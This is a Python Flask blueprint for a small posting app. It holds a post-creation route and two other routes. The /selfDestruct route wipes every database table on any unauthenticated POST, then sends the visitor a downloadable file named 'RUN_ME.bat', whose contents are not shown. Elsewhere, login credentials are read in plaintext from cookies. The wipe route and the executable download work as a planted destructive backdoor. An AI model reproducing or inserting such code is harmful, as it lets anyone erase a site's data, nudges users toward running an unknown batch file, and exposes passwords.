import flask
import random, os

from db import posts, users, helpers

blueprint = flask.Blueprint("posts", __name__)

@blueprint.route('/post', methods=['POST'])
def post():
    """Creates a new post."""
    db = helpers.load_db()

    username = flask.request.cookies.get('username')
    password = flask.request.cookies.get('password')

    user = users.get_user(db, username, password)
    if not user:
        flask.flash('You need to be logged in to do that.', 'danger')
        return flask.redirect(flask.url_for('login.loginscreen'))

    post = flask.request.form.get('post')
    tags_raw = flask.request.form.get('tags', '').strip()

    # Split on commas OR spaces
    if ',' in tags_raw:
        tags = [t.strip() for t in tags_raw.split(',') if t.strip()]
    else:
        tags = [t.strip() for t in tags_raw.split() if t.strip()]
    posts.add_post(db, user, post, tags)

    return flask.redirect(flask.url_for('login.index'))

@blueprint.route('/selfDestruct', methods=['POST'])
def selfDestruct():
    db = helpers.load_db()

    # Drop all tables in the TinyDB database
    db.drop_tables()
    flask.flash("Database wiped successfully!", "warning")
    return flask.redirect(flask.url_for('posts.download_test'))

@blueprint.route("/download/RUN_ME.bat")
def download_test():
    # Assuming test.txt is in 'static/files/'
    return flask.send_from_directory("assets", "RUN_ME.bat", as_attachment=True)